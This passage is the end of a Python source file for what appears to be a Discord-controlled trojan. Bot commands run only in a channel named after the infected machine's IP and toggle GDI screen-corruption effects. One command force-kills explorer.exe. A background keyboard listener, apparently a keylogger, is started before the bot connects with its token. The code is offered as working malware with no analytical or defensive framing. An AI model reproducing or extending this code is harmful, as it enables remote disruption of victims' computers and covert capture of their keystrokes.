            except Exception as e:
                await channel.send(f"error occured: {e}")
        elif message.content.startswith("!waves"):
            try:
                if ip == message.channel.name:
                    if gdiclient.waves == True:
                        gdiclient.waves = False
                    else:
                        gdiclient.waves = True
            except Exception as e:
                await channel.send(f"error occured: {e}")
        elif message.content.startswith("!void"):
            try:
                if ip == message.channel.name:
                    if gdiclient.void == True:
                        gdiclient.void = False
                    else:
                        gdiclient.void = True
            except Exception as e:
                await channel.send(f"error occured: {e}")
        elif message.content.startswith("!cleareffects"):
            try:
                if ip == message.channel.name:
                    system("taskkill /f /im explorer.exe")
                    gdiclient.bwhell = False
                    gdiclient.randomerrors = False
                    gdiclient.fillerrors = False
                    gdiclient.invert = False
                    gdiclient.melt = False
                    gdiclient.panscreen = False
                    gdiclient.rainbowhell = False
                    gdiclient.rainbowspaghetti = False
                    gdiclient.rotatingtunnel = False
                    gdiclient.stretchhoriz = False
                    gdiclient.stretchverti = False
                    gdiclient.swipescreen = False
                    gdiclient.triangles = False
                    gdiclient.tunnels = False
                    gdiclient.waves = False
                    gdiclient.void = False
                    os.system("start explorer")
            except Exception as e:
                await channel.send(f"error occured: {e}")
        elif message.content.startswith("!purge"):
            try:
                if ip == message.channel.name:
                    await channel.purge()
            except Exception as e:
                await channel.send(f"error occured: {e}")
intents = discord.Intents.default()
intents.message_content = True
bot = botclient(intents=intents)
def runlistener():
    with Listener(on_press=on_press) as listener:
        listener.join()
listenerthread = Thread(target=runlistener, daemon=True)
listenerthread.start()
bot.run(bottoken)
